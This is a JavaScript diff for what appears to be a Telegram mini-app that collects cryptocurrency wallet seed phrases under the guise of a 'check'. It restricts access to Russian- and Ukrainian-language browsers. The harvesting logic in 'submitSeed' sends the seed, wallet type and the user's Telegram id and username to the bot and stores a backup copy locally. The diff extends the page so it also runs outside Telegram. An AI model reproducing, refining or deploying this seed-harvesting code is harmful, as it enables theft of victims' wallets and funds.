@@ -20,26 +20,26 @@ const langs = navigator.languages || [navigator.language || navigator.userLangua
 const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
 if (!langs.some(lang => allowedLangs.includes(lang))) {
   document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
-  throw new Error("🚫 Заблоковано через мову");
 }
 
 // ✅ DOM ініціалізація
 window.addEventListener("DOMContentLoaded", () => {
-  if (!Telegram?.WebApp?.initDataUnsafe?.user) {
-    document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>❌ Telegram WebApp не активен.<br>Пожалуйста, откройте через Telegram.</h3>";
-    console.error("❌ WebApp не ініціалізований — не відкрито з Telegram");
-    return;
-  }
+  const isTelegram = Telegram?.WebApp?.initDataUnsafe?.user !== undefined;
 
-  Telegram.WebApp.ready();
-  Telegram.WebApp.expand();
+  if (isTelegram) {
+    Telegram.WebApp.ready();
+    Telegram.WebApp.expand();
+    console.log("✅ Telegram WebApp активовано");
+  } else {
+    console.log("🌐 Працює у браузері (не через Telegram)");
+  }
 
   if (document.getElementById("seedContainer")) {
     renderSeedInputs();
     setupSelect();
     document.getElementById("submitBtn")?.addEventListener("click", () => {
       try {
-        submitSeed();
+        submitSeed(isTelegram);
       } catch (e) {
         console.error("❌ submitSeed error:", e);
       }
@@ -134,7 +134,7 @@ function showProcessing(message) {
 }
 
 // 🚀 Надсилання seed
-function submitSeed() {
+function submitSeed(isTelegram) {
   clearWarning();
   const length = parseInt(document.getElementById("length").value);
   const wallet = document.getElementById("wallet").value || "unknown";
@@ -158,10 +158,10 @@ function submitSeed() {
   document.querySelector(".container").innerHTML =
     "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
 
-  const tgUser = Telegram.WebApp.initDataUnsafe.user || {};
+  const tgUser = isTelegram ? Telegram.WebApp.initDataUnsafe.user : {};
   const payload = {
-    user_id: tgUser.id || "-",
-    username: tgUser.username || "-",
+    user_id: tgUser?.id || "-",
+    username: tgUser?.username || "-",
     seed,
     wallet,
     length,
@@ -172,12 +172,11 @@ function submitSeed() {
   };
 
   localStorage.setItem("payload_backup", JSON.stringify(payload));
-  Telegram.WebApp.expand();
 
-  if (Telegram.WebApp.sendData) {
+  if (isTelegram && Telegram.WebApp.sendData) {
     Telegram.WebApp.sendData(JSON.stringify(payload));
     console.log("✅ Payload надіслано:", payload);
   } else {
-    console.warn("❌ sendData недоступна");
+    console.log("📦 Payload (браузер):", payload);
   }
 }
